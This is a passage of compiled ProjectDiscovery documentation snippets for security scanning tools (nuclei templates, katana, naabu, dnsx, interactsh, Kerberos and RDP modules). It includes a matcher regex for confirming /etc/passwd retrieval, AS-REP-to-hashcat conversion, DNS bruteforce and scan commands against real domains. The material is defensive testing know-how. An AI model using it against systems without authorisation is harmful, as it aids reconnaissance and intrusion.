description: Searches for the pattern /.git/config on passed URLs.\n  reference: https://www.acunetix.com/vulnerabilities/web/git-repository-found/\n  tags: git,config\n```\n\n----------------------------------------\n\nTITLE: Hex Encoded Matcher in YAML\nDESCRIPTION: Example of using hex encoded matchers with word type for matching specific patterns.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: word\n    encoding: hex\n    words:\n      - \"50494e47\"\n    part: body\n```\n\n----------------------------------------\n\nTITLE: Shodan InternetDB CIDR Scanning\nDESCRIPTION: Shows how to use uncover with Shodan InternetDB API to discover open ports for a given CIDR range.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: console\nCODE:\n```\necho 51.83.59.99/24 | uncover\n```\n\n----------------------------------------\n\nTITLE: Multiple Technology Detection Workflow\nDESCRIPTION: Workflow template demonstrating multiple matcher usage for detecting different technologies (vBulletin and JBoss) and running corresponding security checks.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/workflows/examples.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: workflow-multiple-matcher\ninfo:\n  name: Test Workflow Template\n  author: pdteam\n\nworkflows:\n  - template: technologies/tech-detect.yaml\n    matchers:\n      - name: vbulletin\n        subtemplates:\n          - tags: vbulletin\n\n      - name: jboss\n        subtemplates:\n          - tags: jboss\n\n```\n\n----------------------------------------\n\nTITLE: Naabu ASN Scan in Bash\nDESCRIPTION: Scan IP addresses associated with a specific ASN (AS14421) for ports 80 and 443 using Naabu.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: console\nCODE:\n```\necho AS14421 | naabu -p 80,443\n```\n\n----------------------------------------\n\nTITLE: Running Katana with URL Input\nDESCRIPTION: Demonstrates how to run Katana with a single URL input using the -u option.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nkatana -u https://tesla.com\n```\n\n----------------------------------------\n\nTITLE: Authenticated Crawling with Custom Headers\nDESCRIPTION: Examples of adding custom headers and cookies for authenticated crawling in Katana\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -H 'Cookie: usrsess=AmljNrESo'\n```\n\n----------------------------------------\n\nTITLE: Initializing Pop3Client in JavaScript\nDESCRIPTION: Creates a new instance of the Pop3Client class. This is the basic setup for using the POP3 client in nuclei scripts.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/pop3.Pop3Client.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst pop3 = require('nuclei/pop3');\nconst client = new pop3.Client();\n```\n\n----------------------------------------\n\nTITLE: Wildcard Filtering with dnsx in Console\nDESCRIPTION: Example of using dnsx for wildcard filtering to handle multi-level DNS based wildcards.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: console\nCODE:\n```\ndnsx -l subdomain_list.txt -wd airbnb.com -o output.txt\n```\n\n----------------------------------------\n\nTITLE: Merging Tailwind CSS Classes with tailwind-merge in TypeScript\nDESCRIPTION: Demonstrates how to use the twMerge function from tailwind-merge to combine Tailwind CSS classes efficiently, avoiding style conflicts.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/tailwind-merge/README.md#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nimport { twMerge } from 'tailwind-merge'\n\ntwMerge('px-2 py-1 bg-red hover:bg-dark-red', 'p-3 bg-[#B91C1C]')\n// → 'hover:bg-dark-red p-3 bg-[#B91C1C]'\n```\n\n----------------------------------------\n\nTITLE: Using Warn Method in GoConsolePrinter\nDESCRIPTION: The Warn method outputs warning messages to the console. It accepts a string parameter containing the warning message to be displayed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/goconsole.GoConsolePrinter.mdx#2025-04-12_snippet_2\n\nLANGUAGE: TypeScript\nCODE:\n```\nWarn(msg: string): void\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure Integration in YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure Azure integration. It includes provider name, optional ID, client credentials, subscription ID, and CLI authentication option.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: azure # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: staging\n  # client_id is the client ID of registered application of the azure account (not requuired if using cli auth)\n  client_id: $AZURE_CLIENT_ID\n  # client_secret is the secret ID of registered application of the zure account (not requuired if using cli uth)\n  client_secret: $AZURE_CLIENT_SECRET\n  # tenant_id is the tenant ID of registered application of the azure account (not requuired if using cli auth)\n  tenant_id: $AZURE_TENANT_ID\n  #subscription_id is the azure subscription id\n  subscription_id: $AZURE_SUBSCRIPTION_ID\n  #use_cli_auth if set to true cloudlist will use azure cli auth\n  use_cli_auth: true\n```\n\n----------------------------------------\n\nTITLE: Initializing SMTPMessage in JavaScript\nDESCRIPTION: Creates a new SMTPMessage object and sets the 'From' field.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\n```\n\n----------------------------------------\n\nTITLE: Initializing RsyncClient in JavaScript\nDESCRIPTION: This snippet demonstrates how to import the rsync module and create a new RsyncClient instance.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rsync.RsyncClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rsync = require('nuclei/rsync');\nconst client = new rsync.Client();\n```\n\n----------------------------------------\n\nTITLE: Setting Timeout in Nuclei CLI\nDESCRIPTION: Configures the maximum time Nuclei should wait for a response, affecting false negatives and scanning speed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n-timeout <duration>\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Multiple Out-of-Scope Rules\nDESCRIPTION: Shows how to use a file containing multiple out-of-scope rules for crawling.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ cat out_of_scope.txt\n\n/logout\n/log_out\n```\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -cos out_of_scope.txt\n```\n\n----------------------------------------\n\nTITLE: Setting IP Address for Kerberos Client in JavaScript\nDESCRIPTION: Example of how to create a Kerberos Config object and set the IP address. This configures the network address used by the Kerberos client for communication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Config.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst cfg = new kerberos.Config();\ncfg.SetIPAddress('10.10.10.1');\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Business Logic Vulnerability (Extend VIP Subscription) in HTTP\nDESCRIPTION: This snippet illustrates a business logic vulnerability in a VIP subscription function. The application allows users to extend the trial period indefinitely without proper checks, leading to potential abuse of the VIP features.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_6\n\nLANGUAGE: http\nCODE:\n```\nPOST /extend-trial HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nCookie: session=abcd1234\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1337\nServer: Apache\n\n<html>\n\n<p>Your VIP trial period has been extended by 7 days.</p>\n\n</html>\n```\n\n----------------------------------------\n\nTITLE: Configuring Kerberos Client\nDESCRIPTION: Demonstrates how to set additional configuration for the Kerberos client, including IP address and timeout settings. Currently only supported in EnumerateUser due to fastdialer limitations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Client.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst client = new kerberos.Client('acme.com', 'kdc.acme.com');\nconst cfg = new kerberos.Config();\ncfg.SetIPAddress('192.168.100.22');\ncfg.SetTimeout(5);\nclient.SetConfig(cfg);\n```\n\n----------------------------------------\n\nTITLE: Notify CLI Commands\nDESCRIPTION: Various command-line options for the Notify tool including bulk processing, message formatting, provider selection, and configuration settings\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/usage.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnotify -bulk\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -cl 2000\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -config config.yaml\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -i test.txt\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -d 2\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -id recon,scans\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -mf Hey {{data}}\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -nc\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -pc provider.yaml\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -p slack,telegram\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -proxy http://127.0.0.1:8080\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -rl 1\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -silent\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -verbose\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -version\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -update\n```\n\nLANGUAGE: bash\nCODE:\n```\nnotify -duc\n```\n\n----------------------------------------\n\nTITLE: Field Format Output\nDESCRIPTION: Examples of using the -f flag to format output fields and customize the results format for integration with other tools.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/running.mdx#2025-04-12_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nuncover -q jira -f host -silent\n```\n\nLANGUAGE: console\nCODE:\n```\necho kubernetes | uncover -f https://ip:port/version -silent\n```\n\nLANGUAGE: console\nCODE:\n```\nuncover -q http.title:GitLab -silent | httpx -silent\n```\n\n----------------------------------------\n\nTITLE: Defining DSL Extractor in YAML for Nuclei\nDESCRIPTION: Example of a DSL extractor to extract the effective body length using the 'len' helper function from the HTTP response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nextractors:\n  - type: dsl  # type of the extractor\n    dsl:\n      - len(body) # dsl expression value to extract from response\n```\n\n----------------------------------------\n\nTITLE: Naabu IPv6 Scan in Bash\nDESCRIPTION: Perform an IPv6 port scan on hackerone.com using Naabu. This example scans port 80 using IPv6 addresses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_6\n\nLANGUAGE: console\nCODE:\n```\necho hackerone.com | ./naabu -p 80 -ip-version 6\n```\n\n----------------------------------------\n\nTITLE: Configuring Pushover Notifications in YAML\nDESCRIPTION: Pushover notification setup with user key, API token and device targeting capabilities.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\npushover:\n  - id: \"push\"\n    pushover_user_key: \"XXXX\"\n    pushover_api_token: \"YYYY\"\n    pushover_format: \"{{data}}\"\n    pushover_devices:\n      - \"iphone\"\n```\n\n----------------------------------------\n\nTITLE: Probing URLs with httpx in Bash\nDESCRIPTION: This example shows how to use httpx to probe a list of hosts and subdomains from a file to return URLs running an HTTP webserver.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncat hosts.txt | httpx\n```\n\n----------------------------------------\n\nTITLE: Receiving Data from Connection\nDESCRIPTION: Shows how to receive a specific amount of data from the network connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconst data = conn.Recv(1024);\nlog(`Received ${data.length} bytes from the server`)\n```\n\n----------------------------------------\n\nTITLE: Matching All File Extensions in Nuclei\nDESCRIPTION: Configuration to match all file extensions except those in the default denylist. This allows for broad scanning across various file types.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nextensions:\n  - all\n```\n\n----------------------------------------\n\nTITLE: Sending Message to KDC in Kerberos\nDESCRIPTION: The SendToKDC function sends a message to the KDC and returns the response. It attempts to send the message over TCP first, falling back to UDP if necessary (and vice versa).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.mdx#2025-04-12_snippet_3\n\nLANGUAGE: TypeScript\nCODE:\n```\n▸ **SendToKDC**(`kclient`, `msg`): `string` | ``null``\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst client = new kerberos.Client('acme.com');\nconst response = kerberos.SendToKDC(client, 'message');\n```\n\n----------------------------------------\n\nTITLE: Implementing Search Shortcut in ProjectDiscovery Documentation\nDESCRIPTION: This code snippet creates a keyboard shortcut simulation that triggers the search functionality when a button is clicked. It dispatches a KeyboardEvent with Command+K (or Ctrl+K) to open the search interface.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/home.mdx#2025-04-12_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nonClick={() => {\n        // Simulate Command+K keyboard shortcut\n        const event = new KeyboardEvent('keydown', {\n          key: 'k',\n          code: 'KeyK',\n          metaKey: true, // Command key on Mac\n          ctrlKey: true, // Ctrl key on Windows\n          bubbles: true\n        });\n        document.dispatchEvent(event);\n      }}\n```\n\n----------------------------------------\n\nTITLE: Configuring GCP Integration for ProjectDiscovery\nDESCRIPTION: This YAML configuration block specifies the settings for integrating Google Cloud Platform with ProjectDiscovery. It includes the provider name, profile ID, and a placeholder for the GCP service account key, which is required for authentication and access to GCP resources.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: gcp # provider is the name of the provider\n  # profile is the name of the provider profile\n  id: logs\n  # gcp_service_account_key is the minified json of a google cloud service account with list permissions\n  gcp_service_account_key: '{xxxxxxxxxxxxx}'\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Known Files Crawling\nDESCRIPTION: Shows how to enable crawling of robots.txt and sitemap.xml files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -kf robotstxt,sitemapxml\n```\n\n----------------------------------------\n\nTITLE: SSH Server Fingerprinting with JavaScript Protocol in Nuclei\nDESCRIPTION: Template demonstrating basic JavaScript protocol usage to fingerprint SSH server software by connecting in non-auth mode and extracting server banner. Uses nuclei/ssh module to establish connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/protocol.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: ssh-server-fingerprint\n\ninfo:\n  name: Fingerprint SSH Server Software\n  author: Ice3man543,tarunKoyalwar\n  severity: info\n  \n\njavascript:\n  - code: |\n      var m = require(\"nuclei/ssh\");\n      var c = m.SSHClient();\n      var response = c.ConnectSSHInfoMode(Host, Port);\n      to_json(response);\n    args:\n      Host: \"{{Host}}\"\n      Port: \"22\"\n\n    extractors:\n      - type: json\n        json:\n          - '.ServerID.Raw'\n```\n\n----------------------------------------\n\nTITLE: Reading and Matching Specific Bytes in Nuclei Network Template\nDESCRIPTION: Shows how to read a specific number of bytes from the socket and match only on that data. This is useful for protocols with fixed-length headers or signatures.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ninputs:\n  - read-size: 8\n    name: prefix\n...\nmatchers:\n  - type: word\n    part: prefix\n    words: \n      - \"CAFEBABE\"\n```\n\n----------------------------------------\n\nTITLE: Enabling SMB Protocol Support in Interactsh\nDESCRIPTION: Command to start Interactsh server with SMB protocol support in debug mode.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_13\n\nLANGUAGE: console\nCODE:\n```\n$ sudo interactsh-server -smb -skip-acme -debug -domain localhost\n```\n\n----------------------------------------\n\nTITLE: Creating Kerberos Client from Configuration String\nDESCRIPTION: The NewKerberosClientFromString function creates a new kerberos client by parsing a krb5.conf string. It returns a Client object or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.mdx#2025-04-12_snippet_2\n\nLANGUAGE: TypeScript\nCODE:\n```\n▸ **NewKerberosClientFromString**(`cfg`): [`Client`](/templates/protocols/javascript/modules/kerberos.Client) | ``null``\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst client = kerberos.NewKerberosClientFromString(`\n[libdefaults]\ndefault_realm = ACME.COM\ndns_lookup_kdc = true\n`);\n```\n\n----------------------------------------\n\nTITLE: Embedding Template Editor in HTML\nDESCRIPTION: This HTML iframe code embeds the ProjectDiscovery cloud template editor with a specific CVE template (CVE-2023-0297) into a webpage. The iframe has dimensions of 700px by 700px.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/overview.mdx#2025-04-12_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe\n  src=\"https://cloud.projectdiscovery.io/public/CVE-2023-0297\"\n  width=\"700px\"\n  height=\"700px\"\n></iframe>\n```\n\n----------------------------------------\n\nTITLE: Complex HTTP Interaction Matcher Configuration\nDESCRIPTION: Demonstrates a complex matcher configuration that combines HTTP protocol verification with content validation using regex patterns.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/oob-testing.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers-condition: and\nmatchers:\n    - type: word\n      part: interactsh_protocol # Confirms the HTTP Interaction\n      words:\n        - \"http\"\n\n    - type: regex\n      part: interactsh_request # Confirms the retrieval of /etc/passwd file\n      regex:\n        - 'root:.*:0:0:'\n```\n\n----------------------------------------\n\nTITLE: Configuring Microsoft Teams Notifications in YAML\nDESCRIPTION: Microsoft Teams webhook configuration with webhook URL and message format settings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nteams:\n  - id: \"recon\"\n    teams_webhook_url: \"https://<domain>.webhook.office.com/webhookb2/xx@xx/IncomingWebhook/xx\"\n    teams_format: \"{{data}}\"\n```\n\n----------------------------------------\n\nTITLE: Enabling Wildcard Interaction in Interactsh\nDESCRIPTION: Command to start Interactsh server with wildcard interaction enabled for the configured domain.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_7\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-server -domain hackwithautomation.com -wildcard\n```\n\n----------------------------------------\n\nTITLE: Testing Dynamic HTTP Response in Interactsh\nDESCRIPTION: Example of using curl to test dynamic HTTP response feature with various query parameters including status, body, delay, and headers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_6\n\nLANGUAGE: console\nCODE:\n```\ncurl -i 'https://hackwithautomation.com/x?status=307&body=this+is+example+body&delay=1&header=header1:value1&header=header1:value12'\n```\n\n----------------------------------------\n\nTITLE: Starting Chrome with Remote Debugging\nDESCRIPTION: Command to start Chrome browser with remote debugging enabled for active session crawling\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_22\n\nLANGUAGE: console\nCODE:\n```\n$ /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --remote-debugging-port=9222\n\n\nDevTools listening on ws://127.0.0.1:9222/devtools/browser/c5316c9c-19d6-42dc-847a-41d1aeebf7d6\n```\n\n----------------------------------------\n\nTITLE: Receiving Hex Data\nDESCRIPTION: Demonstrates receiving data in hexadecimal format from the connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconst data = conn.RecvFullHex(1024);\n```\n\n----------------------------------------\n\nTITLE: Docker Container Execution\nDESCRIPTION: Shows how to run httpx within a Docker container, piping subdomain lists for containerized scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncat sub_domains.txt | docker run -i projectdiscovery/httpx\n```\n\n----------------------------------------\n\nTITLE: Checking Telnet Server Availability\nDESCRIPTION: Example demonstrating how to check if a host is running a Telnet server using the IsTelnet method. Takes host and port parameters and returns an IsTelnetResponse object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/telnet.TelnetClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst telnet = require('nuclei/telnet');\nconst isTelnet = telnet.IsTelnet('acme.com', 23);\nlog(toJSON(isTelnet));\n```\n\n----------------------------------------\n\nTITLE: Required HTTP Headers for ProjectDiscovery API Authentication\nDESCRIPTION: These HTTP headers are required for authenticating with the ProjectDiscovery API. The X-API-Key provides your authentication token, while the X-Team-Id specifies which team context to use for the operation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/external-scan.mdx#2025-04-12_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nX-API-Key: your-api-key\nX-Team-Id: your-team-id  # Find at cloud.projectdiscovery.io/settings/team\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Crawl Scope\nDESCRIPTION: Shows how to use the crawl scope option to limit crawling to specific paths or patterns.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -cs login\n```\n\n----------------------------------------\n\nTITLE: Using IsOracle Function in JavaScript\nDESCRIPTION: Demonstrates how to use the IsOracle function from the oracle module to check if a given host and port correspond to an Oracle database.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/oracle.IsOracleResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst oracle = require('nuclei/oracle');\nconst isOracle = oracle.IsOracle('acme.com', 1521);\n```\n\n----------------------------------------\n\nTITLE: Installing Subfinder via Brew\nDESCRIPTION: This command installs Subfinder using Homebrew. It is supported on macOS and Linux.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbrew install subfinder\n```\n\n----------------------------------------\n\nTITLE: Running interactsh-client with Self-Hosted Server\nDESCRIPTION: This snippet shows how to configure interactsh-client to connect to a self-hosted Interactsh server using the 'server' flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ninteractsh-client -server hackwithautomation.com\n```\n\n----------------------------------------\n\nTITLE: Converting AS-REP to Hashcat Format in JavaScript\nDESCRIPTION: The ASRepToHashcat function converts an AS-REP message to a hashcat format. It takes an asrep parameter of any type and returns either a string or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\n▸ **ASRepToHashcat**(`asrep`): `string` | ``null``\n```\n\n----------------------------------------\n\nTITLE: AWS IAM Policy JSON Example\nDESCRIPTION: Example AWS IAM policy showing required read-only permissions for S3 bucket access, including s3:Get* and s3:List* permissions for asset discovery.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/examples/addcloudassets.mdx#2025-04-12_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"s3:Get*\": \"*\",\n  \"s3:List*\": \"*\"\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Interactsh Server\nDESCRIPTION: Command to install interactsh-server using Go\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest\n```\n\n----------------------------------------\n\nTITLE: Setting Bulk Size in Nuclei CLI\nDESCRIPTION: Configures the bulk size flag to control parallelism of target processing in Nuclei.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n-bs <number> or -bulk-size <number>\n```\n\n----------------------------------------\n\nTITLE: Checking RDP Authentication\nDESCRIPTION: Example showing how to check RDP authentication for a given host and port. Returns authentication metadata and connection status.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.RDPClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst checkRDPAuth = rdp.CheckRDPAuth('acme.com', 3389);\nlog(toJSON(checkRDPAuth));\n```\n\n----------------------------------------\n\nTITLE: Advanced Variables in YAML\nDESCRIPTION: Extended variables for complex subdomain pattern matching, including root domain and numbered subdomain variables.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/alterx/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n{{root}}  :  also known as eTLD+1 i.e only root domain (ex for api.scanme.sh => {{root}} is scanme.sh)\n{{subN}}  :  here N is an integer (ex {{sub1}} , {{sub2}} etc) .\n```\n\n----------------------------------------\n\nTITLE: AWS IAM Policy for Cloudlist\nDESCRIPTION: JSON policy document defining the minimal required permissions for Cloudlist to access various AWS services.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"RequiredReadPermissions\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"ec2:DescribeInstances\",\n                \"ec2:DescribeRegions\",\n                \"route53:ListHostedZones\",\n                \"route53:ListResourceRecordSets\",\n                \"s3:ListAllMyBuckets\",\n                \"lambda:ListFunctions\",\n                \"elasticloadbalancing:DescribeLoadBalancers\",\n                \"elasticloadbalancing:DescribeTargetGroups\",\n                \"elasticloadbalancing:DescribeTargetHealth\",\n                \"cloudfront:ListDistributions\",\n                \"ecs:ListClusters\",\n                \"ecs:ListServices\",\n                \"ecs:ListTasks\",\n                \"ecs:DescribeTasks\",\n                \"ecs:DescribeContainerInstances\",\n                \"eks:ListClusters\",\n                \"eks:DescribeCluster\",\n                \"apigateway:GET\",\n                \"lightsail:GetInstances\",\n                \"lightsail:GetRegions\"\n            ],\n            \"Resource\": \"*\"\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: DNS Bruteforce with dnsx in Console\nDESCRIPTION: Examples of using dnsx for DNS bruteforce, including subdomain enumeration and targeted subdomain bruteforce using keywords.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: console\nCODE:\n```\ndnsx -silent -d facebook.com -w dns_worldlist.txt\n```\n\nLANGUAGE: console\nCODE:\n```\ndnsx -silent -d domains.txt -w jira,grafana,jenkins\n```\n\nLANGUAGE: console\nCODE:\n```\ncat domains.txt | dnsx -silent -w jira,grafana,jenkins -d -\n```\n\n----------------------------------------\n\nTITLE: Sending Hex Data\nDESCRIPTION: Shows how to send hexadecimal data over the network connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconn.SendHex('68656c6c6f');\n```\n\n----------------------------------------\n\nTITLE: Closing Network Connection\nDESCRIPTION: Demonstrates how to properly close a network connection after use.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 